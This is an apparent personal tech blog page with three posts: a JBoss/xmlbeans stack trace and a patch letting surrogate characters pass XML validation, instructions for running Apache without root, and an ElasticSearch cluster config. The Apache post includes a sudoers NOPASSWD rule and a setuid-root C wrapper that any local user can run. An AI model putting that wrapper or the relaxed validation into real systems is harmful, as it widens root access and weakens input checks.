<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">2016-01-05 19:02:29,194 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at org.apache.xmlbeans.impl.values.XmlObjectBase$SerializedRootObject.readObject(XmlObjectBase.java:2652)</span><br><span class="line">2016-01-05 19:02:29,194 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)</span><br><span class="line">2016-01-05 19:02:29,194 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)</span><br><span class="line">2016-01-05 19:02:29,194 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)</span><br><span class="line">2016-01-05 19:02:29,194 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at java.lang.reflect.Method.invoke(Method.java:497)</span><br><span class="line">2016-01-05 19:02:29,194 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at org.jboss.marshalling.reflect.SerializableClass.callReadObject(SerializableClass.java:307)</span><br><span class="line">2016-01-05 19:02:29,194 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at org.jboss.marshalling.cloner.SerializingCloner.initSerializableClone(SerializingCloner.java:303)</span><br><span class="line">2016-01-05 19:02:29,194 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at org.jboss.marshalling.cloner.SerializingCloner.clone(SerializingCloner.java:251)</span><br><span class="line">2016-01-05 19:02:29,194 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at org.jboss.marshalling.cloner.SerializingCloner.clone(SerializingCloner.java:172)</span><br><span class="line">2016-01-05 19:02:29,194 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at org.jboss.marshalling.cloner.SerializingCloner.clone(SerializingCloner.java:128)</span><br><span class="line">2016-01-05 19:02:29,194 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at org.jboss.as.ejb3.remote.LocalEjbReceiver.clone(LocalEjbReceiver.java:295)</span><br><span class="line">2016-01-05 19:02:29,194 [http-/0.0.0.0:9080-1] INFO  stdout  - 	... 42 more</span><br><span class="line">2016-01-05 19:02:29,195 [http-/0.0.0.0:9080-1] INFO  stdout  - Caused by: org.apache.xmlbeans.XmlException: error: Illegal XML Character: 0xd840</span><br><span class="line">2016-01-05 19:02:29,195 [http-/0.0.0.0:9080-1] INFO  stdout  - org.apache.xmlbeans.impl.piccolo.io.IllegalCharException: Illegal XML Character: 0xd840</span><br><span class="line">2016-01-05 19:02:29,195 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at org.apache.xmlbeans.impl.piccolo.xml.XMLReaderReader.read(XMLReaderReader.java:146)</span><br><span class="line">2016-01-05 19:02:29,195 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at org.apache.xmlbeans.impl.piccolo.xml.PiccoloLexer.yy_refill(PiccoloLexer.java:3474)</span><br><span class="line">2016-01-05 19:02:29,195 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at org.apache.xmlbeans.impl.piccolo.xml.PiccoloLexer.yylex(PiccoloLexer.java:3958)</span><br><span class="line">2016-01-05 19:02:29,195 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at org.apache.xmlbeans.impl.piccolo.xml.Piccolo.yylex(Piccolo.java:1290)</span><br><span class="line">2016-01-05 19:02:29,195 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at org.apache.xmlbeans.impl.piccolo.xml.Piccolo.yyparse(Piccolo.java:1400)</span><br><span class="line">2016-01-05 19:02:29,195 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at org.apache.xmlbeans.impl.piccolo.xml.Piccolo.parse(Piccolo.java:714)</span><br><span class="line">2016-01-05 19:02:29,195 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at org.apache.xmlbeans.impl.store.Locale$SaxLoader.load(Locale.java:3435)</span><br><span class="line">2016-01-05 19:02:29,195 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at org.apache.xmlbeans.impl.store.Locale.parse(Locale.java:706)</span><br><span class="line">2016-01-05 19:02:29,195 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at org.apache.xmlbeans.impl.store.Locale.parseToXmlObject(Locale.java:690)</span><br><span class="line">2016-01-05 19:02:29,195 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at org.apache.xmlbeans.impl.store.Locale.parseToXmlObject(Locale.java:677)</span><br><span class="line">2016-01-05 19:02:29,195 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at org.apache.xmlbeans.impl.schema.SchemaTypeLoaderBase.parse(SchemaTypeLoaderBase.java:208)</span><br><span class="line">2016-01-05 19:02:29,195 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at org.apache.xmlbeans.impl.values.XmlObjectBase$SerializedRootObject.readObject(XmlObjectBase.java:2648)</span><br><span class="line">2016-01-05 19:02:29,196 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)</span><br><span class="line">2016-01-05 19:02:29,196 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)</span><br><span class="line">2016-01-05 19:02:29,196 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)</span><br><span class="line">2016-01-05 19:02:29,196 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at java.lang.reflect.Method.invoke(Method.java:497)</span><br><span class="line">2016-01-05 19:02:29,196 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at org.jboss.marshalling.reflect.SerializableClass.callReadObject(SerializableClass.java:307)</span><br><span class="line">2016-01-05 19:02:29,196 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at org.jboss.marshalling.cloner.SerializingCloner.initSerializableClone(SerializingCloner.java:303)</span><br><span class="line">2016-01-05 19:02:29,196 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at org.jboss.marshalling.cloner.SerializingCloner.clone(SerializingCloner.java:251)</span><br><span class="line">2016-01-05 19:02:29,196 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at org.jboss.marshalling.cloner.SerializingCloner.clone(SerializingCloner.java:172)</span><br><span class="line">2016-01-05 19:02:29,196 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at org.jboss.marshalling.cloner.SerializingCloner.clone(SerializingCloner.java:128)</span><br><span class="line">2016-01-05 19:02:29,196 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at org.jboss.as.ejb3.remote.LocalEjbReceiver.clone(LocalEjbReceiver.java:295)</span><br><span class="line">2016-01-05 19:02:29,196 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at org.jboss.as.ejb3.remote.LocalEjbReceiver.clone(LocalEjbReceiver.java:286)</span><br><span class="line">2016-01-05 19:02:29,196 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at org.jboss.as.ejb3.remote.LocalEjbReceiver.processInvocation(LocalEjbReceiver.java:258)</span><br><span class="line">2016-01-05 19:02:29,196 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at org.jboss.ejb.client.EJBClientInvocationContext.sendRequest(EJBClientInvocationContext.java:184)</span><br><span class="line">2016-01-05 19:02:29,196 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at org.jboss.ejb.client.EJBObjectInterceptor.handleInvocation(EJBObjectInterceptor.java:58)</span><br><span class="line">2016-01-05 19:02:29,197 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at org.jboss.ejb.client.EJBClientInvocationContext.sendRequest(EJBClientInvocationContext.java:186)</span><br><span class="line">2016-01-05 19:02:29,197 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at org.jboss.ejb.client.EJBHomeInterceptor.handleInvocation(EJBHomeInterceptor.java:83)</span><br><span class="line">2016-01-05 19:02:29,197 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at org.jboss.ejb.client.EJBClientInvocationContext.sendRequest(EJBClientInvocationContext.java:186)</span><br><span class="line">2016-01-05 19:02:29,197 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at org.jboss.ejb.client.TransactionInterceptor.handleInvocation(TransactionInterceptor.java:42)</span><br><span class="line">2016-01-05 19:02:29,197 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at org.jboss.ejb.client.EJBClientInvocationContext.sendRequest(EJBClientInvocationContext.java:186)</span><br><span class="line">2016-01-05 19:02:29,197 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at org.jboss.ejb.client.ReceiverInterceptor.handleInvocation(ReceiverInterceptor.java:125)</span><br><span class="line">2016-01-05 19:02:29,197 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at org.jboss.ejb.client.EJBClientInvocationContext.sendRequest(EJBClientInvocationContext.java:186)</span><br><span class="line">2016-01-05 19:02:29,197 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at org.jboss.ejb.client.EJBInvocationHandler.sendRequestWithPossibleRetries(EJBInvocationHandler.java:255)</span><br><span class="line">2016-01-05 19:02:29,197 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at org.jboss.ejb.client.EJBInvocationHandler.doInvoke(EJBInvocationHandler.java:200)</span><br><span class="line">2016-01-05 19:02:29,197 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at org.jboss.ejb.client.EJBInvocationHandler.doInvoke(EJBInvocationHandler.java:183)</span><br><span class="line">2016-01-05 19:02:29,197 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at org.jboss.ejb.client.EJBInvocationHandler.invoke(EJBInvocationHandler.java:146)</span><br><span class="line">2016-01-05 19:02:29,197 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at com.sun.proxy.$Proxy36.getYYSubmission(Unknown Source)</span><br><span class="line">2016-01-05 19:02:29,197 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at xx.webservices.esubmission.EsubmissionSkeleton.getYYSubmission(EsubmissionSkeleton.java:64)</span><br><span class="line">2016-01-05 19:02:29,197 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at xx.webservices.esubmission.EsubmissionMessageReceiverInOut.invokeBusinessLogic(EsubmissionMessageReceiverInOut.java:51)</span><br><span class="line">2016-01-05 19:02:29,197 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at org.apache.axis2.receivers.AbstractInOutSyncMessageReceiver.invokeBusinessLogic(AbstractInOutSyncMessageReceiver.java:42)</span><br><span class="line">2016-01-05 19:02:29,198 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at org.apache.axis2.receivers.AbstractMessageReceiver.receive(AbstractMessageReceiver.java:96)</span><br><span class="line">2016-01-05 19:02:29,198 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at org.apache.axis2.engine.AxisEngine.receive(AxisEngine.java:145)</span><br><span class="line">2016-01-05 19:02:29,198 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at org.apache.axis2.transport.http.util.RESTUtil.invokeAxisEngine(RESTUtil.java:125)</span><br><span class="line">2016-01-05 19:02:29,198 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at org.apache.axis2.transport.http.util.RESTUtil.processURLRequest(RESTUtil.java:119)</span><br><span class="line">2016-01-05 19:02:29,198 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at org.apache.axis2.transport.http.AxisServlet$RestRequestProcessor.processURLRequest(AxisServlet.java:799)</span><br><span class="line">2016-01-05 19:02:29,198 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at org.apache.axis2.transport.http.AxisServlet.doGet(AxisServlet.java:242)</span><br><span class="line">2016-01-05 19:02:29,198 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at javax.servlet.http.HttpServlet.service(HttpServlet.java:734)</span><br><span class="line">2016-01-05 19:02:29,198 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at javax.servlet.http.HttpServlet.service(HttpServlet.java:847)</span><br><span class="line">2016-01-05 19:02:29,198 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:295)</span><br><span class="line">2016-01-05 19:02:29,198 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:214)</span><br><span class="line">2016-01-05 19:02:29,198 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:231)</span><br><span class="line">2016-01-05 19:02:29,198 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:149)</span><br><span class="line">2016-01-05 19:02:29,198 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at org.jboss.as.jpa.interceptor.WebNonTxEmCloserValve.invoke(WebNonTxEmCloserValve.java:50)</span><br><span class="line">2016-01-05 19:02:29,198 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at org.jboss.as.jpa.interceptor.WebNonTxEmCloserValve.invoke(WebNonTxEmCloserValve.java:50)</span><br><span class="line">2016-01-05 19:02:29,199 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at org.jboss.as.web.security.SecurityContextAssociationValve.invoke(SecurityContextAssociationValve.java:169)</span><br><span class="line">2016-01-05 19:02:29,199 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:150)</span><br><span class="line">2016-01-05 19:02:29,199 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:97)</span><br><span class="line">2016-01-05 19:02:29,199 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:102)</span><br><span class="line">2016-01-05 19:02:29,199 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:344)</span><br><span class="line">2016-01-05 19:02:29,199 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at org.apache.coyote.http11.Http11Processor.process(Http11Processor.java:854)</span><br><span class="line">2016-01-05 19:02:29,199 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at org.apache.coyote.http11.Http11Protocol$Http11ConnectionHandler.process(Http11Protocol.java:653)</span><br><span class="line">2016-01-05 19:02:29,199 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at org.apache.tomcat.util.net.JIoEndpoint$Worker.run(JIoEndpoint.java:926)</span><br><span class="line">2016-01-05 19:02:29,199 [http-/0.0.0.0:9080-1] INFO  stdout  - 	at java.lang.Thread.run(Thread.java:745)</span><br></pre></td></tr></table></figure>

<h1 id="Update-method-read-in-class-XMLReaderReader-from-source-code-of-xmlbeans"><a href="#Update-method-read-in-class-XMLReaderReader-from-source-code-of-xmlbeans" class="headerlink" title="Update method read in class XMLReaderReader from source code of xmlbeans"></a>Update method <em>read</em> in class XMLReaderReader from source code of xmlbeans</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">if (c &gt;= 0x20) &#123;</span><br><span class="line">    if ((c &lt;= 0xD7FF) ||</span><br><span class="line">        (c &gt;= 0xE000 &amp;&amp; c &lt;= 0xFFFD) ||</span><br><span class="line">        (c &gt;= 0x10000 &amp;&amp; c &lt;= 0x10FFFF) ||</span><br><span class="line">        // bypass surrogate pair character</span><br><span class="line">        XMLChar.isHighSurrogate(c) || XMLChar.isLowSurrogate(c)) &#123;</span><br><span class="line"></span><br><span class="line">        sawCR = false;</span><br><span class="line">        destbuf[off+ (charsRead++)] = c;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">        throw new IllegalCharException(</span><br><span class="line">        &quot;Illegal XML Character: 0x&quot;+Integer.toHexString(c));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Call-webservice-via-http-again"><a href="#Call-webservice-via-http-again" class="headerlink" title="Call webservice via http again"></a>Call webservice via http again</h1><p> <code>curl http://10.13.135.37:9080/yy_ws/services/esubmission/getYYSubmission</code><br> Result as </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">This XML file does not appear to have any style information associated with it. The document tree is shown below.</span><br><span class="line">&lt;type:YYSubmissionResponse xmlns:type=&quot;http://www.yy.gov.hk/ww/lsexchange/type&quot;&gt;</span><br><span class="line">&lt;type:out xmlns:type=&quot;http://www.yy.gov.hk/ww/lsexchange/type&quot;&gt;</span><br><span class="line">&lt;type:FromDateTime xmlns:type=&quot;http://www.yy.gov.hk/ww/lsexchange/type&quot;&gt;2016-01-05T19:53:15.159+08:00&lt;/type:FromDateTime&gt;</span><br><span class="line">&lt;type:ToDateTime xmlns:type=&quot;http://www.yy.gov.hk/ww/lsexchange/type&quot;&gt;2016-01-05T19:53:15.159+08:00&lt;/type:ToDateTime&gt;</span><br><span class="line">&lt;type:NoOfSubmission xmlns:type=&quot;http://www.yy.gov.hk/ww/lsexchange/type&quot;&gt;2&lt;/type:NoOfSubmission&gt;</span><br><span class="line">&lt;type:eSubmissionList xmlns:type=&quot;http://www.yy.gov.hk/ww/lsexchange/type&quot;&gt;</span><br><span class="line">&lt;type:eSubmission xmlns:type=&quot;http://www.yy.gov.hk/ww/lsexchange/type&quot;&gt;𠃙&lt;/type:eSubmission&gt;</span><br><span class="line">&lt;type:eSubmission xmlns:type=&quot;http://www.yy.gov.hk/ww/lsexchange/type&quot;&gt;𠁙&lt;/type:eSubmission&gt;</span><br><span class="line">&lt;/type:eSubmissionList&gt;</span><br><span class="line">&lt;/type:out&gt;</span><br><span class="line">&lt;/type:YYSubmissionResponse&gt;</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-Running-apache-as-a-non-root-user" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2015-12-21T06:37:44.000Z"><a href="/2015/12/21/Running-apache-as-a-non-root-user/">2015-12-21</a></time>
      
      
  
    <h1 class="title"><a href="/2015/12/21/Running-apache-as-a-non-root-user/">Running apache as a non-root user</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <h1 id="sudo"><a href="#sudo" class="headerlink" title="sudo"></a>sudo</h1><p>in file sudoers add following<br>  <code>username    ALL=NOPASSWD:/usr/bin/service apache2 reload</code></p>
<h1 id="Run-on-port-8080-and-use-iptables-to-redirect-packets"><a href="#Run-on-port-8080-and-use-iptables-to-redirect-packets" class="headerlink" title="Run on port 8080 and use iptables to redirect packets"></a>Run on port 8080 and use iptables to redirect packets</h1><p><code>iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to 8080</code></p>
<h1 id="setuid-wrapper-program"><a href="#setuid-wrapper-program" class="headerlink" title="setuid wrapper program"></a>setuid wrapper program</h1><p>httpdctrl.c</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;signal.h&gt;</span><br><span class="line">#include &lt;strings.h&gt;</span><br><span class="line"></span><br><span class="line">// allow start/stop/restart of apache by non-root users</span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv)</span><br><span class="line">&#123;</span><br><span class="line">  char *cmd, *cmd2, *usage;</span><br><span class="line"></span><br><span class="line">  // UPDATE THIS LINE:</span><br><span class="line">  cmd = &quot;/your/path/to/httpd/sbin/apachectl&quot;;</span><br><span class="line">  cmd2 = &quot;apachectl&quot;;</span><br><span class="line">  usage = &quot;Usage: COMMAND [start|stop|restart]\n&quot;;</span><br><span class="line"></span><br><span class="line">  if ( argc != 2 ) &#123;</span><br><span class="line">    printf(usage);</span><br><span class="line">    exit(1);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  setegid(0);</span><br><span class="line">  seteuid(0);</span><br><span class="line">  setgid(0);</span><br><span class="line">  setuid(0);</span><br><span class="line"></span><br><span class="line">  if ( strncmp(argv[1], &quot;start&quot;, 5) == 0 ) &#123;</span><br><span class="line">    if (execl(cmd, cmd2, &quot;start&quot;, (char*)0) &lt; 0) &#123;</span><br><span class="line">     perror(&quot;Error&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; else if ( strncmp(argv[1], &quot;stop&quot;, 4) == 0 ) &#123;</span><br><span class="line">    if (execl(cmd, cmd2, &quot;stop&quot;, (char*)0) &lt; 0) &#123;</span><br><span class="line">     perror(&quot;Error&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; else if ( strncmp(argv[1], &quot;restart&quot;, 7) == 0 ) &#123;</span><br><span class="line">    if (execl(cmd, cmd2, &quot;restart&quot;, (char*)0) &lt; 0) &#123;</span><br><span class="line">     perror(&quot;Error&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    printf(usage);</span><br><span class="line">    exit(1);</span><br><span class="line">  &#125;</span><br><span class="line">  exit(0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -o httpdctrl httpdctrl.c</span><br><span class="line">sudo chown root:root httpdctrl</span><br><span class="line">sudo chmod u+s httpdctrl</span><br></pre></td></tr></table></figure>

<h1 id="Run-on-docker-lxc-runC"><a href="#Run-on-docker-lxc-runC" class="headerlink" title="Run on docker, lxc, runC"></a>Run on docker, lxc, runC</h1><p><code>docker pull apache</code></p>
<h1 id="If-you-only-need-super-basic-stuff-on-a-non-priv-port-you-could-run"><a href="#If-you-only-need-super-basic-stuff-on-a-non-priv-port-you-could-run" class="headerlink" title="If you only need super-basic stuff on a non-priv port, you could run:"></a>If you only need super-basic stuff on a non-priv port, you could run:</h1><p><code>python -m SimpleHTTPServer 8000</code></p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a target="_blank" rel="noopener" href="http://stackoverflow.com/questions/525672/is-there-a-way-to-start-restart-stop-apache-server-on-linux-as-non-root-user">http://stackoverflow.com/questions/525672/is-there-a-way-to-start-restart-stop-apache-server-on-linux-as-non-root-user</a><br><a target="_blank" rel="noopener" href="http://askubuntu.com/questions/694036/apache-as-non-root">http://askubuntu.com/questions/694036/apache-as-non-root</a><br><a target="_blank" rel="noopener" href="http://serverfault.com/questions/69847/linux-how-to-give-a-user-permission-to-restart-apache">http://serverfault.com/questions/69847/linux-how-to-give-a-user-permission-to-restart-apache</a><br><a target="_blank" rel="noopener" href="http://www.debian-administration.org/article/386/Running_network_services_as_a_non-root_user">http://www.debian-administration.org/article/386/Running_network_services_as_a_non-root_user</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-Do-Something-With-ElasticSearch" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2015-12-11T03:37:44.000Z"><a href="/2015/12/11/Do-Something-With-ElasticSearch/">2015-12-11</a></time>
      
      
  
    <h1 class="title"><a href="/2015/12/11/Do-Something-With-ElasticSearch/">Do Something With ElasticSearch</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <h1 id="elasticsearch-yml-node01-node02"><a href="#elasticsearch-yml-node01-node02" class="headerlink" title="elasticsearch.yml (node01, node02)"></a>elasticsearch.yml (node01, node02)</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">network.host: $xx</span><br><span class="line">http.port: 9200</span><br><span class="line">transport.tcp.port: 9300</span><br><span class="line">index.number_of_replicas: 1</span><br><span class="line">discovery:</span><br><span class="line">  zen:</span><br><span class="line">    ping:</span><br><span class="line">      multicast.enabled: false</span><br><span class="line">      unicast.hosts: [&quot;$yy&quot;]</span><br><span class="line">      timeout: &quot;3s&quot;</span><br><span class="line">cluster:</span><br><span class="line">  name: es-cluster</span><br><span class="line">node:</span><br><span class="line">  name: $zz</span><br><span class="line">path.repo: [&quot;/mount/backups&quot;]</span><br><span class="line"></span><br><span class="line">index.search.slowlog.threshold.query.warn: 10s</span><br><span class="line">index.search.slowlog.threshold.query.info: 5s</span><br><span class="line">index.search.slowlog.threshold.query.debug: 2s</span><br><span class="line">index.search.slowlog.threshold.query.trace: 500ms</span><br><span class="line"></span><br><span class="line">index.search.slowlog.threshold.fetch.warn: 1s</span><br><span class="line">index.search.slowlog.threshold.fetch.info: 800ms</span><br><span class="line">index.search.slowlog.threshold.fetch.debug: 500ms</span><br><span class="line">index.search.slowlog.threshold.fetch.trace: 200ms</span><br><span class="line"></span><br><span class="line">index.indexing.slowlog.threshold.index.warn: 10s</span><br><span class="line">index.indexing.slowlog.threshold.index.info: 5s</span><br><span class="line">index.indexing.slowlog.threshold.index.debug: 2s</span><br><span class="line">index.indexing.slowlog.threshold.index.trace: 500ms</span><br></pre></td></tr></table></figure>

<p>replace vairable in node01 with ($xx&#x3D;node01, $yy&#x3D;node2, $zz&#x3D;es-node01)<br>replace vairable in node02 with ($xx&#x3D;node02, $yy&#x3D;node1, $zz&#x3D;es-node02)</p>
